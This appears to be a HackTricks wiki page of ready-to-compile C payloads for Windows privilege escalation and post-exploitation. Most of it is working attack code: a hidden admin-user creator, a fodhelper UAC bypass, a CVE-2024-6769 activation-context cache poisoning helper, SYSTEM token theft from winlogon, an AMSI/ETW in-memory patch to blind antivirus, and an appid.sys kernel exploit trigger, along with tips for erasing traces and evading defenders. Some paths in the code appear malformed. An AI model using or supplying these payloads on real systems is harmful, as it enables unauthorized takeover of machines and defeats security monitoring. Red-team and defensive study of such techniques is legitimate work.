# Windows C Payloads

{{#include ../../banners/hacktricks-training.md}}

This page collects **small, self-contained C snippets** that are handy during Windows Local Privilege Escalation or post-exploitation.  Each payload is designed to be **copy-paste friendly**, requires only the Windows API / C runtime, and can be compiled with `i686-w64-mingw32-gcc` (x86) or `x86_64-w64-mingw32-gcc` (x64).

> ⚠️  These payloads assume that the process already has the minimum privileges necessary to perform the action (e.g. `SeDebugPrivilege`, `SeImpersonatePrivilege`, or medium-integrity context for a UAC bypass).  They are intended for **red-team or CTF settings** where exploiting a vulnerability has landed arbitrary native code execution.

---

## Add local administrator user

```c
// i686-w64-mingw32-gcc -s -O2 -o addadmin.exe addadmin.c
#include <stdlib.h>
int main(void) {
    system("net user hacker Hacker123! /add");
    system("net localgroup administrators hacker /add");
    return 0;
}
```

---

## UAC Bypass – `fodhelper.exe` Registry Hijack (Medium → High integrity)
When the trusted binary **`fodhelper.exe`** is executed, it queries the registry path below **without filtering the `DelegateExecute` verb**.  By planting our command under that key an attacker can bypass UAC *without* dropping a file to disk.

*Registry path queried by `fodhelper.exe`*
```
HKCU\Software\Classes\ms-settings\Shell\Open\command
```
A minimal PoC that pops an elevated `cmd.exe`:

```c
// x86_64-w64-mingw32-gcc -municode -s -O2 -o uac_fodhelper.exe uac_fodhelper.c
#define _CRT_SECURE_NO_WARNINGS
#include <windows.h>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

int main(void) {
    HKEY hKey;
    const char *payload = "C:\\Windows\\System32\\cmd.exe"; // change to arbitrary command

    // 1. Create the vulnerable registry key
    if (RegCreateKeyExA(HKEY_CURRENT_USER,
        "Software\\Classes\\ms-settings\\Shell\\Open\\command", 0, NULL, 0,
        KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {

        // 2. Set default value => our payload
        RegSetValueExA(hKey, NULL, 0, REG_SZ,
            (const BYTE*)payload, (DWORD)strlen(payload) + 1);

        // 3. Empty "DelegateExecute" value = trigger (")
        RegSetValueExA(hKey, "DelegateExecute", 0, REG_SZ,
            (const BYTE*)"", 1);

        RegCloseKey(hKey);

        // 4. Launch auto-elevated binary
        system("fodhelper.exe");
    }
    return 0;
}
```
*Tested on Windows 10 22H2 and Windows 11 23H2 (July 2025 patches). The bypass still works because Microsoft has not fixed the missing integrity check in the `DelegateExecute` path.*

---

## UAC Bypass – Activation Context Cache Poisoning (`ctfmon.exe`, CVE-2024-6769)
Drive remapping + activation context cache poisoning still works against patched Windows 10/11 builds because `ctfmon.exe` runs as a high-integrity trusted UI process that happily loads from the caller’s impersonated `C:` drive and reuses whatever DLL redirections `CSRSS` has cached. Abuse goes as follows: re-point `C:` at attacker-controlled storage, drop a trojanized `msctf.dll`, launch `ctfmon.exe` to gain high integrity, then ask `CSRSS` to cache a manifest that redirects a DLL used by an auto-elevated binary (e.g., `fodhelper.exe`) so the next launch inherits your payload without a UAC prompt.

Practical workflow:
1. Prepare a fake `%SystemRoot%\System32` tree and copy the legitimate binary you plan to hijack (often `ctfmon.exe`).
2. Use `DefineDosDevice(DDD_RAW_TARGET_PATH)` to remap `C:` inside your process, keeping `DDD_NO_BROADCAST_SYSTEM` so the change stays local.
3. Drop your DLL + manifest into the fake tree, call `CreateActCtx/ActivateActCtx` to push the manifest into the activation-context cache, then launch the auto-elevated binary so it resolves the redirected DLL straight into your shellcode.
4. Delete the cache entry (`sxstrace ClearCache`) or reboot when finished to erase attacker fingerprints.

<details>
<summary>C - Fake drive + manifest poison helper (CVE-2024-6769)</summary>

```c
#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <shlwapi.h>
#pragma comment(lib, "shlwapi.lib")

BOOL WriteWideFile(const wchar_t *path, const wchar_t *data) {
    HANDLE h = CreateFileW(path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (h == INVALID_HANDLE_VALUE) return FALSE;
    DWORD bytes = (DWORD)(wcslen(data) * sizeof(wchar_t));
    BOOL ok = WriteFile(h, data, bytes, &bytes, NULL);
    CloseHandle(h);
    return ok;
}

int wmain(void) {
    const wchar_t *stage = L"C:\\Users\\Public\\fakeC\\Windows\\System32";
    SHCreateDirectoryExW(NULL, stage, NULL);
    CopyFileW(L"C:\\Windows\\System32\\ctfmon.exe", L"C:\\Users\\Public\\fakeC\\Windows\\System32\\ctfmon.exe", FALSE);
    CopyFileW(L".\\msctf.dll", L"C:\\Users\\Public\\fakeC\\Windows\\System32\\msctf.dll", FALSE);

    DefineDosDeviceW(DDD_RAW_TARGET_PATH | DDD_NO_BROADCAST_SYSTEM,
                     L"C:", L"\\??\\C:\\Users\\Public\\fakeC");

    const wchar_t manifest[] =
        L"<?xml version='1.0' encoding='UTF-8' standalone='yes'?>"
        L"<assembly xmlns='urn:schemas-microsoft-com:asm.v1' manifestVersion='1.0'>"
        L" <dependency><dependentAssembly>"
        L"  <assemblyIdentity name='Microsoft.Windows.Common-Controls' version='6.0.0.0'"
        L"   processorArchitecture='amd64' publicKeyToken='6595b64144ccf1df' language='*' />"
        L"  <file name='advapi32.dll' loadFrom='C:\\Users\\Public\\fakeC\\Windows\\System32\\msctf.dll' />"
        L" </dependentAssembly></dependency></assembly>";
    WriteWideFile(L"C:\\Users\\Public\\fakeC\\payload.manifest", manifest);

    ACTCTXW act = { sizeof(act) };
    act.lpSource = L"C:\\Users\\Public\\fakeC\\payload.manifest";
    ULONG_PTR cookie = 0;
    HANDLE ctx = CreateActCtxW(&act);
    ActivateActCtx(ctx, &cookie);

    STARTUPINFOW si = { sizeof(si) };
    PROCESS_INFORMATION pi = { 0 };
    CreateProcessW(L"C:\\Windows\\System32\\ctfmon.exe", NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);

    WaitForSingleObject(pi.hProcess, 2000);
    DefineDosDeviceW(DDD_REMOVE_DEFINITION, L"C:", L"\\??\\C:\\Users\\Public\\fakeC");
    return 0;
}
```

</details>

Cleanup tip: after popping SYSTEM, call `sxstrace Trace -logfile %TEMP%\sxstrace.etl` followed by `sxstrace Parse` when testing—if you see your manifest name in the log, defenders can too, so rotate paths each run.

---

## Spawn SYSTEM shell via token duplication (`SeDebugPrivilege` + `SeImpersonatePrivilege`)
If the current process holds **both** `SeDebug` and `SeImpersonate` privileges (typical for many service accounts), you can steal the token from `winlogon.exe`, duplicate it, and start an elevated process:

```c
// x86_64-w64-mingw32-gcc -O2 -o system_shell.exe system_shell.c -ladvapi32 -luser32
#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>

DWORD FindPid(const wchar_t *name) {
    PROCESSENTRY32W pe = { .dwSize = sizeof(pe) };
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return 0;
    if (!Process32FirstW(snap, &pe)) return 0;
    do {
        if (!_wcsicmp(pe.szExeFile, name)) {
            DWORD pid = pe.th32ProcessID;
            CloseHandle(snap);
            return pid;
        }
    } while (Process32NextW(snap, &pe));
    CloseHandle(snap);
    return 0;
}

int wmain(void) {
    DWORD pid = FindPid(L"winlogon.exe");
    if (!pid) return 1;

    HANDLE hProc   = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
    HANDLE hToken  = NULL, dupToken = NULL;

    if (OpenProcessToken(hProc, TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | TOKEN_QUERY, &hToken) &&
        DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &dupToken)) {

        STARTUPINFOW si = { .cb = sizeof(si) };
        PROCESS_INFORMATION pi = { 0 };
        if (CreateProcessWithTokenW(dupToken, LOGON_WITH_PROFILE,
                L"C\\\\Windows\\\\System32\\\\cmd.exe", NULL, CREATE_NEW_CONSOLE,
                NULL, NULL, &si, &pi)) {
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
        }
    }
    if (hProc) CloseHandle(hProc);
    if (hToken) CloseHandle(hToken);
    if (dupToken) CloseHandle(dupToken);
    return 0;
}
```
For a deeper explanation of how that works see:

{{#ref}}
sedebug-+-seimpersonate-copy-token.md
{{#endref}}

---

## In-Memory AMSI & ETW Patch (Defence Evasion)
Most modern AV/EDR engines rely on **AMSI** and **ETW** to inspect malicious behaviours.  Patching both interfaces early inside the current process prevents script-based payloads (e.g. PowerShell, JScript) from being scanned.

```c
// gcc -o patch_amsi.exe patch_amsi.c -lntdll
#define _CRT_SECURE_NO_WARNINGS
#include <windows.h>
#include <stdio.h>

void Patch(BYTE *address) {
    DWORD oldProt;
    // mov eax, 0x80070057 ; ret  (AMSI_RESULT_E_INVALIDARG)
    BYTE patch[] = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
    VirtualProtect(address, sizeof(patch), PAGE_EXECUTE_READWRITE, &oldProt);
    memcpy(address, patch, sizeof(patch));
    VirtualProtect(address, sizeof(patch), oldProt, &oldProt);
}

int main(void) {
    HMODULE amsi  = LoadLibraryA("amsi.dll");
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");

    if (amsi)  Patch((BYTE*)GetProcAddress(amsi,  "AmsiScanBuffer"));
    if (ntdll) Patch((BYTE*)GetProcAddress(ntdll, "EtwEventWrite"));

    MessageBoxA(NULL, "AMSI & ETW patched!", "OK", MB_OK);
    return 0;
}
```
*The patch above is process-local; spawning a new PowerShell after running it will execute without AMSI/ETW inspection.*

---

## Create child as Protected Process Light (PPL)
Request a PPL protection level for a child at creation time using `STARTUPINFOEX` + `PROC_THREAD_ATTRIBUTE_PROTECTION_LEVEL`. This is a documented API and will only succeed if the target image is signed for the requested signer class (Windows/WindowsLight/Antimalware/LSA/WinTcb).

```c
// x86_64-w64-mingw32-gcc -O2 -o spawn_ppl.exe spawn_ppl.c
#include <windows.h>

int wmain(void) {
    STARTUPINFOEXW si = {0};
    PROCESS_INFORMATION pi = {0};
    si.StartupInfo.cb = sizeof(si);

    SIZE_T attrSize = 0;
    InitializeProcThreadAttributeList(NULL, 1, 0, &attrSize);
    si.lpAttributeList = (PPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, attrSize);
    InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &attrSize);

    DWORD lvl = PROTECTION_LEVEL_ANTIMALWARE_LIGHT; // choose the desired level
    UpdateProcThreadAttribute(si.lpAttributeList, 0,
        PROC_THREAD_ATTRIBUTE_PROTECTION_LEVEL,
        &lvl, sizeof(lvl), NULL, NULL);

    if (!CreateProcessW(L"C\\\Windows\\\System32\\\notepad.exe", NULL, NULL, NULL, FALSE,
                        EXTENDED_STARTUPINFO_PRESENT, NULL, NULL, &si.StartupInfo, &pi)) {
        // likely ERROR_INVALID_IMAGE_HASH (577) if the image is not properly signed for that level
        return 1;
    }
    DeleteProcThreadAttributeList(si.lpAttributeList);
    HeapFree(GetProcessHeap(), 0, si.lpAttributeList);
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    return 0;
}
```

Levels used most commonly:
- `PROTECTION_LEVEL_WINDOWS_LIGHT` (2)
- `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` (3)
- `PROTECTION_LEVEL_LSA_LIGHT` (4)

Validate the result with Process Explorer/Process Hacker by checking the Protection column.

---

## Local Service -> Kernel via `appid.sys` Smart-Hash (`IOCTL 0x22A018`, CVE-2024-21338)
`appid.sys` exposes a device object (`\\.\\AppID`) whose smart-hash maintenance IOCTL accepts user-supplied function pointers whenever the caller runs as `LOCAL SERVICE`; Lazarus is abusing that to disable PPL and load arbitrary drivers, so red teams should have a ready-made trigger for lab use.

Operational notes:
- You still need a `LOCAL SERVICE` token. Steal it from `Schedule` or `WdiServiceHost` using `SeImpersonatePrivilege`, then impersonate before touching the device so ACL checks pass.
- IOCTL `0x22A018` expects a struct containing two callback pointers (query length + read function). Point both at user-mode stubs that craft a token overwrite or map ring-0 primitives, but keep the buffers RWX so KernelPatchGuard does not crash mid-chain.
- After success, drop out of impersonation and revert the device handle; defenders now look for unexpected `Device\\AppID` handles, so close it immediately once privilege is gained.

<details>
<summary>C - Skeleton trigger for `appid.sys` smart-hash abuse</summary>

```c
#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <stdio.h>

typedef struct _APPID_SMART_HASH {
    ULONGLONG UnknownCtx[4];
    PVOID QuerySize;   // called first
    PVOID ReadBuffer;  // called with size returned above
    BYTE  Reserved[0x40];
} APPID_SMART_HASH;

DWORD WINAPI KernelThunk(PVOID ctx) {
    // map SYSTEM shellcode, steal token, etc.
    return 0;
}

int wmain(void) {
    HANDLE hDev = CreateFileW(L"\\\\.\\AppID", GENERIC_WRITE, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (hDev == INVALID_HANDLE_VALUE) {
        printf("[-] CreateFileW failed: %lu\n", GetLastError());
        return 1;
    }

    APPID_SMART_HASH in = {0};
    in.QuerySize = KernelThunk;
    in.ReadBuffer = KernelThunk;

    DWORD bytes = 0;
    if (!DeviceIoControl(hDev, 0x22A018, &in, sizeof(in), NULL, 0, &bytes, NULL)) {
        printf("[-] DeviceIoControl failed: %lu\n", GetLastError());
    }
    CloseHandle(hDev);
    return 0;
}
```

</details>

Minimal fix-up for a weaponized build: map an RWX section with `VirtualAlloc`, copy your token duplication stub there, set `KernelThunk = section`, and once `DeviceIoControl` returns you should be SYSTEM even under PPL.

---

## References
* Ron Bowes – “Fodhelper UAC Bypass Deep Dive” (2024)
* SplinterCode – “AMSI Bypass 2023: The Smallest Patch Is Still Enough” (BlackHat Asia 2023)
* CreateProcessAsPPL – minimal PPL process launcher: https://github.com/2x7EQ13/CreateProcessAsPPL
* Microsoft Docs – STARTUPINFOEX / InitializeProcThreadAttributeList / UpdateProcThreadAttribute
* DarkReading – ["Novel Exploit Chain Enables Windows UAC Bypass"](https://www.darkreading.com/vulnerabilities-threats/windows-activation-context-cache-elevation) (2024)
* Avast Threat Labs – ["Lazarus Deploys New FudModule Rootkit"](https://decoded.avast.io/threatresearch/lazarus-deploys-new-fudmodule-rootkit/) (2024)

{{#include ../../banners/hacktricks-training.md}}
